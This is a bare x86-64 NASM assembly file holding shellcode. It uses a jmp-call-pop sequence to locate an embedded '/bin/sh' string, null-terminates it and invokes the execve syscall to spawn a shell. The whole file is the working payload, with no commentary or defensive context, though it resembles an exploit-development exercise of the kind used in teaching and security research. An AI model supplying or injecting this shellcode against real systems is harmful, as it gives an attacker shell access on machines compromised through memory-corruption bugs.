BITS 64

section .data
global _start

_start:
  jmp ed

st:
  pop rdi
  xor rbx, rbx
  mov [rdi+7], bl
  xor rsi, rsi
  xor rdx, rdx
  mov al, 0x3b
  syscall

ed:
  call st
  db '/bin/sh'
